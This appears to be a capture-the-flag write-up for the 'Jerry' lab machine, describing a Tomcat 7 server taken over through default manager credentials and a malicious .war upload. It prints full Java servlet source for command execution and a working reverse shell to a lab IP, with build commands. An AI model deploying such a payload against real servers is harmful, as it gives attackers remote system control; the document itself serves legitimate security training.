+++
title = 'Jerry'
description = 'Easy Windows'
writeup = true
hideMeta = true
+++

8080 open - has Apache Tomcat version 7.0.88
Tried looking for some CVEs - there are a few but the appropriate web directories dont seem to have any response

Logged into server status with default "admin:admin"
![Jerry (Easy Windows).png](Jerry%20%28Easy%20Windows%29.png)
![Jerry (Easy Windows)-1.png](Jerry%20%28Easy%20Windows%29-1.png)
The box is Windows Server 2012 R2
![Jerry (Easy Windows)-2.png](Jerry%20%28Easy%20Windows%29-2.png)
![Jerry (Easy Windows)-4.png](Jerry%20%28Easy%20Windows%29-4.png)
/manager/html
![Jerry (Easy Windows)-3.png](Jerry%20%28Easy%20Windows%29-3.png)
Reading the documentation provided in one of the links, we are able to upload our own .war file - and the endpoint for this will be at the /{.war file name}. So we simply need to make a Web Application Archive (.war) containing reverse shell code to pwn the user.

To do this, we have to create the project directory and write some java
![Jerry (Easy Windows)-5.png](Jerry%20%28Easy%20Windows%29-5.png)
`javac -source 1.8 -target 1.8 -cp javax.servlet-api-3.0.1.jar Shell.java`
compiling with an older compiler because the tomcat version is old - java versions have to align so tomcat can understand the .class file
`jar -cvf ShellApp.war -C . .` package into .war file

found the servlet api which has dependencies for this thing here:
![Jerry (Easy Windows)-6.png](Jerry%20%28Easy%20Windows%29-6.png)
.....and it works
![Jerry (Easy Windows)-7.png](Jerry%20%28Easy%20Windows%29-7.png)
```java
import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class Shell extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response)
    throws IOException, ServletException {
        response.setContentType("text/plain");
        PrintWriter out = response.getWriter();

        try {
            Process process = Runtime.getRuntime().exec("cmd /c dir");
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
            reader.close();
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
}
```

now to modify to write reverse shell code instead
```java
import java.io.*;
import java.net.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class Shell extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response)
    throws IOException, ServletException {
        String attackerIP = "10.10.16.196";  // Replace with your IP
        int attackerPort = 9000;   // Replace with your port

        try {
            Socket socket = new Socket(attackerIP, attackerPort);

            Process process = Runtime.getRuntime().exec("cmd.exe");
            InputStream pi = process.getInputStream();
            InputStream pe = process.getErrorStream();
            OutputStream po = process.getOutputStream();

            InputStream si = socket.getInputStream();
            OutputStream so = socket.getOutputStream();

            // Thread to send process output to socket
            new Thread(() -> {
                try {
                    copyStream(pi, so);
                } catch (IOException e) {}
            }).start();

            // Thread to send process error to socket
            new Thread(() -> {
                try {
                    copyStream(pe, so);
                } catch (IOException e) {}
            }).start();

            // Thread to send socket input to process input
            new Thread(() -> {
                try {
                    copyStream(si, po);
                } catch (IOException e) {}
            }).start();

        } catch (Exception e) {
            PrintWriter out = response.getWriter();
            out.println("Error: " + e.getMessage());
        }
    }

    private void copyStream(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int length;
        while ((length = in.read(buffer)) != -1) {
            out.write(buffer, 0, length);
            out.flush();
        }
    }
}
```

![Jerry (Easy Windows)-8.png](Jerry%20%28Easy%20Windows%29-8.png)

we are system which is effectively "root" on windows
flags for windows machines are in Desktop

